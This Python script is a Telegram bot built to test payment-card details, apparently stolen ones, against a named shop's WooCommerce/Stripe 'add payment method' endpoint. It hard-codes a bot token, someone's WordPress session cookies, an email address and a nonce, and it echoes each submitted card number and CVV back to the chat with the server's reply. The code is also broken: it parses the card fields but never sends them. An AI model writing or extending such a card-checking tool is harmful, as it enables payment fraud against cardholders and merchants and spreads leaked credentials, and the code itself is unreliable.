import telebot
import requests
import random
import string
from faker import Faker

# Telegram Bot Token
TOKEN = '8072279299:AAHPYhOiKdnivLNkonK_RTISmhE40ucoVik'
bot = telebot.TeleBot(TOKEN)

# Headers and cookie values (replace with your actual values)
WP_SEC_COOKIE = 'peshangsalam2001%7C1747623818%7CaUtmkFcdPhNkivyodBbhmDka8JzASWT7VAbLZU4EdAX%7Cefcd2572447d4501f337be68013c83c70c52e9285abe2f5a5d54606cd38c5dea'
WP_LOGGED_IN_COOKIE = 'peshangsalam2001%7C1747623818%7CaUtmkFcdPhNkivyodBbhmDka8JzAS3327VAbLZU4EdAX%7C5fb7173b3800652912d1977d7f06f909ed83540d981edb0a3a71362d678fd130'
STRIPE_PM_ID = 'pm_1RLFKDCGos24OgX470HOXnj'  # Example, extract from your request

# Faker for random emails
fake = Faker()

def get_random_email():
    return fake.email()

def check_card(card_data):
    # Parse card data
    parts = card_data.split('|')
    if len(parts) != 4:
        return "❌ Invalid format. Use: CC|MM|YY|CVV or CC|MM|2024|123"
    cc = parts[0].strip()
    mm = parts[1].strip()
    yy = parts[2].strip()
    cvv = parts[3].strip()
    if len(yy) == 2:
        yy = f"20{yy}"
    elif len(yy) != 4:
        return "❌ Invalid year format (use 2 or 4 digits)."
    
    email = get_random_email()
    # Headers and cookies
    headers = {
        'Host': 'kiltermonpurepasture.com',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryLDAs04rYKJqlswfi',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'same-origin',
        'Accept-Language': 'en-US,en;q=0.9',
        'Sec-Fetch-Mode': 'cors',
        'Origin': 'https://kiltermonpurepasture.com',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1',
        'Referer': 'https://kiltermonpurepasture.com/my-account-2/add-payment-method/',
        'Cookie': f'wordpress_sec_4386f044e17b28632eab5af87cf998d0={WP_SEC_COOKIE}; wordpress_logged_in_4386f044e17b28632eab5af87cf998d0={WP_LOGGED_IN_COOKIE}; __stripe_mid=11415e57-f4c7-43f5-9322-b7233710355ed20a49; __stripe_sid=288a0fee-3757-40ee-ba25-c54ac85634f56686d4; __ssid=320183e4500217e3ead1f0a77d2600f; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fkiltermonpurepasture.com%2Fmy-account-2%2Fadd-payment-method%2F; tk_qs=; tk_ai=Mg14T5%2FDEdAZWQ5jlGovzd0d; moove_gdpr_popup=%7B%22strict%22%3A%221%22%2C%22thirdparty%22%3A%221%22%2C%22advanced%22%3A%221%22%7D; mailchimp.cart.current_email=peshangsalam2001@gmail.com; mailchimp_user_email=peshangsalam2001%40gmail.com; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_current_add=fd%3D2025-05-05%2003%3A03%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fkiltermonpurepasture.com%2Fmy-account-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first_add=fd%3D2025-05-05%2003%3A03%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fkiltermonpurepasture.com%2Fmy-account-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_migrations=1418474375998%3D1; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2018_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20CriOS%2F130.0.6723.37%20Mobile%2F15E148%20Safari%2F604.1; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; mailchimp_landing_site=https%3A%2F%2Fkiltermonpurepasture.com%2Fmy-account-2%2F'
    }
    
    # Prepare multipart/form-data POST body for admin-ajax.php
    boundary = '----WebKitFormBoundaryLDAs04rYKJqlswfi'
    data = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="action"\r\n\r\n'
        f'create_setup_intent\r\n'
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="wcpay-payment-method"\r\n\r\n'
        f'{STRIPE_PM_ID}\r\n'
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="_ajax_nonce"\r\n\r\n'
        f'4858c65548\r\n'
        f'--{boundary}--\r\n'
    )

    try:
        response = requests.post(
            'https://kiltermonpurepasture.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            timeout=10
        )
        
        # Format response and card info for Telegram
        result = f"""
🟢 Card: {cc}|{mm}|{yy}|{cvv}
📧 Email: {email}
🔍 Response:
{response.text}
"""
        return result
    except Exception as e:
        return f"❌ Error: {str(e)}"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Send card in format: CC|MM|YY|CVV or CC|MM|YYYY|123")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    text = message.text.strip()
    if '|' in text:
        result = check_card(text)
        bot.reply_to(message, result)
    else:
        bot.reply_to(message, "❌ Invalid format. Use: CC|MM|YY|123 or CC|MM|2024|123")

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()